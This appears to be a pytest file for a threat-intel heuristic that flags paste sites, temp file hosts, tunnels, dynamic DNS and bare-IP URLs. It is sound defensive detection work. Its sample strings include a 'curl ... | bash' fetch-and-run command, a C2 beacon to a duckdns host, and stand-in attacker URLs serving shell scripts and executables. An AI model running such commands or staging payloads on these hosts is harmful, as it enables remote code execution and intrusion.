"""Tests for the suspicious platform heuristic layer."""

import pytest
from guardian.intel.heuristics import check_url, check_domain, check_value, check_text


# ── Paste sites ───────────────────────────────────────────────────────────────

def test_pastebin_flagged():
    m = check_domain("pastebin.com")
    assert m is not None
    assert m.category == "Paste Site"

def test_pastebin_url_flagged():
    m = check_url("https://pastebin.com/abc123")
    assert m is not None
    assert m.category == "Paste Site"

def test_pastebin_raw_higher_confidence():
    base = check_url("https://pastebin.com/abc123")
    raw  = check_url("https://pastebin.com/raw/abc123")
    assert raw is not None and base is not None
    assert raw.confidence > base.confidence

def test_hastebin_flagged():
    assert check_domain("hastebin.com") is not None

def test_rentry_flagged():
    assert check_domain("rentry.co") is not None


# ── Temp file hosts ───────────────────────────────────────────────────────────

def test_transfer_sh_flagged():
    m = check_url("https://transfer.sh/payload.sh")
    assert m is not None
    assert m.category == "Temp File Host"
    assert m.confidence >= 70

def test_file_io_flagged():
    assert check_domain("file.io") is not None

def test_gofile_flagged():
    assert check_domain("gofile.io") is not None


# ── URL shorteners ────────────────────────────────────────────────────────────

def test_bitly_flagged():
    m = check_url("https://bit.ly/3xAbCd")
    assert m is not None
    assert m.category == "URL Shortener"

def test_tinyurl_flagged():
    assert check_domain("tinyurl.com") is not None

def test_t_co_flagged():
    assert check_domain("t.co") is not None


# ── Dynamic DNS ───────────────────────────────────────────────────────────────

def test_duckdns_flagged():
    m = check_domain("c2server.duckdns.org")
    assert m is not None
    assert m.category == "Dynamic DNS"

def test_noip_flagged():
    assert check_domain("attacker.ddns.net") is not None

def test_noip_direct():
    assert check_domain("no-ip.com") is not None


# ── Tunnels ───────────────────────────────────────────────────────────────────

def test_ngrok_flagged():
    m = check_url("https://abc123.ngrok.io/upload")
    assert m is not None
    assert m.category == "Tunnel Service"
    assert m.confidence >= 70

def test_ngrok_app_flagged():
    assert check_domain("abc.ngrok-free.app") is not None

def test_serveo_flagged():
    assert check_domain("serveo.net") is not None

def test_cloudflare_tunnel_flagged():
    assert check_domain("something.trycloudflare.com") is not None


# ── Raw code hosting ──────────────────────────────────────────────────────────

def test_raw_github_flagged():
    m = check_url("https://raw.githubusercontent.com/attacker/repo/main/shell.sh")
    assert m is not None
    assert m.category == "Raw Code Hosting"

def test_gist_raw_higher_confidence():
    base = check_url("https://gist.github.com/user/abc")
    raw  = check_url("https://gist.github.com/user/abc/raw")
    assert raw is not None and base is not None
    assert raw.confidence > base.confidence


# ── Bare IP URL ───────────────────────────────────────────────────────────────

def test_bare_ip_url_flagged():
    m = check_url("http://185.220.101.45/payload.exe")
    assert m is not None
    assert m.category == "Bare IP URL"
    assert m.confidence >= 70


# ── Clean values ─────────────────────────────────────────────────────────────

def test_google_clean():
    assert check_domain("google.com") is None

def test_github_clean():
    assert check_domain("github.com") is None

def test_stackoverflow_clean():
    assert check_domain("stackoverflow.com") is None

def test_clean_url():
    assert check_url("https://www.microsoft.com/security") is None


# ── check_value auto-detect ───────────────────────────────────────────────────

def test_check_value_url():
    m = check_value("https://pastebin.com/raw/abc")
    assert m is not None
    assert m.category == "Paste Site"

def test_check_value_domain():
    m = check_value("pastebin.com")
    assert m is not None

def test_check_value_clean():
    assert check_value("google.com") is None


# ── check_text (bulk scan) ────────────────────────────────────────────────────

def test_check_text_finds_pastebin():
    text = "Malware downloaded payload from https://pastebin.com/raw/Xk3jR9 and executed"
    results = check_text(text)
    categories = [r.category for r in results]
    assert "Paste Site" in categories

def test_check_text_finds_ngrok():
    text = "Beacon calling back to https://abc123.ngrok.io/c2/checkin every 30s"
    results = check_text(text)
    assert any(r.category == "Tunnel Service" for r in results)

def test_check_text_finds_multiple():
    text = "curl https://transfer.sh/mal.sh | bash && beacon to c2.duckdns.org"
    results = check_text(text)
    categories = {r.category for r in results}
    assert "Temp File Host" in categories
    assert "Dynamic DNS" in categories

def test_check_text_no_false_positives():
    text = "User logged in from 192.168.1.1, checked github.com and google.com"
    results = check_text(text)
    assert len(results) == 0

def test_check_text_deduplicates():
    text = "https://pastebin.com/abc and https://pastebin.com/xyz both used"
    results = check_text(text)
    paste_hits = [r for r in results if r.category == "Paste Site"]
    assert len(paste_hits) == 1  # deduplicated by category+domain
